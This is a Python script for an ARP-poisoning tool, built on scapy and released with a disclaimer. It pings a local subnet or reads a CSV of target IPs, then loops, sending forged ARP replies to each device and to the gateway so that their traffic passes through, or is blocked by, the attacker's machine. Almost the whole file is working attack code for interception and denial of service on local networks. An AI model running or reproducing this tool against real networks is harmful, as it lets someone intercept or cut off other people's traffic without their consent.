#!/usr/bin/env python3

####################################
#           Disclaimer             #
# ________________________________ #
# I DO NOT TAKE ANY RESPONSIBILITY #
# FOR ANY HARM DONE WITH THIS TOOL #
# IT'S OPEN-SOURCE AND AVAILABLE   #
# TO EVERYONE, AS LONG AS YOU      #
# AREN'T BREAKING THE LICENSE I    #
# DON'T CARE.                      #
# ________________________________ #
#                   by crowfunder  #
####################################

from scapy.all import *
from time import sleep
from getmac import get_mac_address
import sys, os, argparse, subprocess, csv
from multiprocessing import Pool

######################################################################################

ERR = '\033[0;31m'
BAD_ERR = '\033[0;30m'
GREEN = "\033[0;32m"
PURPLE = '\033[1;35m'
YELLOW = '\033[1;33m'
NONE = '\033[0m'
ip_list = []
target_ip = ""
ap_ip = ""
target_mac = ""
ap_mac = ""
interface = ""
pings = 3
logoinvis = False
delay = 0.3
silent = False
csvf = ''
logoinvis = False
useMultiprocessing = False
useCycles = False
cycles = None
pool = None
logo = f"""
{PURPLE} _________________________________________________________________________________________________{NONE}
{PURPLE}|{YELLOW}         ______     ______       _______    ______            ______    _____             ______ {PURPLE}|{NONE}
{PURPLE}|{YELLOW}        / ___  \   / ___  \     / _____ \   \     \          /     /    \    \           /     / {PURPLE}|{NONE}
{PURPLE}|{YELLOW}       / /   / /  / /   / /    / /    / /    \     \        /     /      \    \         /     /  {PURPLE}|{NONE}
{PURPLE}|{YELLOW}      / /___/ /  / /___/ /    / /    / /      \     \      /     /        \    \       /     /   {PURPLE}|{NONE}
{PURPLE}|{YELLOW}     /  _____/  /     __/    / /    / /        \     \    /     /          \    \     /     /    {PURPLE}|{NONE}
{PURPLE}|{YELLOW}    /  /       /  /\  \     / /    / /          \     \  /     /            \    \   /     /     {PURPLE}|{NONE}
{PURPLE}|{YELLOW}   /  /       /  /  \  \   / /____/ /            \     \/     /              \    \ /     /      {PURPLE}|{NONE}
{PURPLE}|{YELLOW}  /__/       /__/    \__\  \_______/              \     \    /                \    /     /       {PURPLE}|{NONE}
{PURPLE}|{YELLOW}                                                   \     \  /                  \  /     /        {PURPLE}|{NONE}
{PURPLE}|____________________________________________________{YELLOW}\     \/{PURPLE}____________________{YELLOW}\/     /{PURPLE}_________|{NONE}
{PURPLE}|{YELLOW}                                                    /\     \                    /     /          {PURPLE}|{NONE}
{PURPLE}|{YELLOW}         ______     ___       _______              /  \     \                  /     /           {PURPLE}|{NONE}
{PURPLE}|{YELLOW}        / ___  \   /  /      / _____ \            /    \     \                /     /            {PURPLE}|{NONE}
{PURPLE}|{YELLOW}       / /   / /  /  /      / /    / /           /     /\     \              /     /             {PURPLE}|{NONE}
{PURPLE}|{YELLOW}      / /___/ /  /  /      / /    / /           /     /  \     \            /     /              {PURPLE}|{NONE}
{PURPLE}|{YELLOW}     / ____ /   /  /      / /    / /           /     /    \     \          /     /               {PURPLE}|{NONE}
{PURPLE}|{YELLOW}    / /   / /  /  /      / /    / /           /     /      \     \        /     /                {PURPLE}|{NONE}
{PURPLE}|{YELLOW}   / /___/ /  /  /____  / /____/ /           /     /        \     \      /     /                 {PURPLE}|{NONE}
{PURPLE}|{YELLOW}  /_______/  /_______/  \_______/           /     /          \     \    /     /                  {PURPLE}|{NONE}
{PURPLE}|{YELLOW}                                           /_____/            \_____\  /_____/                   {PURPLE}|{NONE}
{PURPLE}|_________________________________________________________________________________________________|{NONE}

"""

######################################################################################
# Argparse
parser = argparse.ArgumentParser(description=(GREEN + "Redirects local traffic of multiple devices through your machine also blocking it completely." + NONE))
parser.add_argument('-i', '--interface', type=str, required=True, help='''Pick an interface which'll be used.''')
parser.add_argument('-g', '--gateway', type=str, required=True, help='''Pick your gateway IP Address.''')
parser.add_argument('-t', '--time', type=float, default=0.3, required=False, help='''Optional selection of delays between target poisons. (Default: 0.3) (NOTE: Also affects delays in subprocess popping, if used.''')
parser.add_argument('-p', '--pings', type=int, default=3, required=False, help='''Optional selection of number of pings sent to network targets when parsing ip list. (Default: 3)''')
parser.add_argument('-v', '--csv', type=str, required=False, help='''Optional selection of CSV file/file path containing ip's list in substitution for script-detected network targets. All addresses must be placed in the different lines.''') 
parser.add_argument('-s', '--silent', type=bool, required=False, default=False, choices=[True, False], help='''Optional selection of making the script return no status messages. (Default: False)''')
parser.add_argument('-l', '--logo', type=bool, required=False, default=False, choices=[True, False], help='''Optional selection to turn off the logo visibility. (Default: False)''')
parser.add_argument('-b', '--subprocesses', type=int, required=False, help='''Choose the subprocesses number limit. (NOTE: If '0' is inputted script will automatically select the limit.)''')
parser.add_argument('-c', '--cycles', type=int, required=False, help='''Choose the number of poisoning cycles.''')
args = parser.parse_args()


#####################################################################################
# Ping the target and return command status.
def ping(ip):
    proc = subprocess.Popen(["ping", "-c", str(pings), ip], stdout=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    response = proc.returncode
    return response


#####################################################################################
# Basically just a network scanner
def ip_parser(ap_ip, interface):
    ip_list = []
    clientip = os.popen('ip addr show '+interface+' | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
    rng = ap_ip
    while rng.endswith(".") is False:
        rng = rng[:-1]
    try:
        for ip in range(2, 255):
            address = rng + str(ip)
            if ping(address) == 0:
                if address != clientip:
                    if silent is False:
                        print(f"{GREEN}Found {address}!{NONE}")
                    ip_list.append(address)
                else:
                    pass
            else:
                pass
        return ip_list
    except KeyboardInterrupt:
        return ip_list


#####################################################################################
# ip_parser() alternative for handling csv files.
def csv_parser(csvf):
    if '.csv' in csvf:
        with open(csvf) as file:
            reader = csv.reader(file)
            ip_list = list(reader)
            if ip_list:
                pass
            else:
                if silent is False:
                    print(BAD_ERR + "Empty file provided, halting!" + NONE)
    else:
        if silent is False:
            print(f'{BAD_ERR}Wrong file provided, please use a file with ".csv" extension!{NONE}')
        sys.exit(0)
    return ip_list

        
#####################################################################################
# Just a simple function handling program exiting
def exit_handler(interface, ap_ip):
    try:
        if useMultiprocessing is True:
            if silent is False:
                print("Closing the multiprocesses pool...")
            pool.close()
            if silent is False:
                print(GREEN + "Done!" + NONE)
        if silent is False:
            print(ERR + "Exiting..." + NONE)
        sys.exit(1)
    except KeyboardInterrupt:
        print(ERR + "Please do not interrupt the exiting process!" + NONE)


#####################################################################################
# Poisoning Function
def poisoner(ip_list, interface, delay):
    for target_ip in ip_list:
        print(str(target_ip))
        target_mac = get_mac_address(ip=str(target_ip))
        try:
            send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst= target_mac))
            send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst= ap_mac))
            if silent is False:
                print(GREEN + f"Poisoned {target_ip}" + NONE)
        except Exception as error:
            if silent is False:
                print(ERR + f"Unable to send ARP to {target_ip}" + NONE)
                #return { 'error': error }
        sleep(delay)


#####################################################################################
# Function wrapping eveything up.
def proxier(ap_ip, interface, delay, cycles, useCycles, pool):
    try:
        ap_mac = get_mac_address(ip=ap_ip)
        if csvf:
            if silent is False:
                if logoinvis is False:
                    print(logo)
                print(f"{NONE}Detected a CSV file, skipping IP parsing and importing...")
            ip_list = csv_parser(csvf)
        else:
            if silent is False:
                if logoinvis is False:
                    print(logo)
                print(f"{NONE}Parsing available IP addresses, CTRL+C to stop if you wish...")
            ip_list = ip_parser(ap_ip, interface)
        if silent is False:
            print(GREEN + "\nDone!" + NONE)
        if silent is False:
            print("Starting to Poison the Network...")
        if useCycles is False:
            while 1 < 2:
                if useMultiprocessing is True:
                    pool.apply_async(poisoner, args=(ip_list, interface, delay))
                    sleep(delay)
                else:
                    poisoner(ip_list, interface, delay)
        else:
            while cycles > 0:
                if useMultiprocessing is True:
                    pool.apply_async(poisoner, args=(ip_list, interface, delay))
                    sleep(delay)
                else:
                    poisoner(ip_list, interface, delay)
                cycles = cycles - 1
            print(f"{GREEN}Finished all cycles, exiting...{NONE}")
            exit_handler(interface, ap_ip)
    except KeyboardInterrupt:
        if silent is False:
            print(ERR + "\nUser Interrupt, exiting..." + NONE)
        exit_handler(interface, ap_ip)


#####################################################################################
# Main
def main():
    global silent
    global csvf
    global logoinvis
    global useCycles
    global cycles
    global delay
    global useMultiprocessing
    global pool
    if args.interface:
        interface = args.interface
    if args.gateway:
        ap_ip = args.gateway
    if args.time:
        delay = args.time
    if args.pings:
        pings = args.pings
    if args.csv:
        csvf = args.csv
    if args.silent:
        silent = args.silent
    if args.logo:
        logoinvis = args.logo
    if args.subprocesses:
        useMultiprocessing = True
        subprocesses = args.subprocesses
        pool = Pool(subprocesses)
        if subprocesses == 0:
            pool = Pool()
    if args.cycles:
        useCycles = True
        cycles = args.cycles
    proxier(ap_ip, interface, delay, cycles, useCycles, pool)


if __name__ == '__main__':
    main()
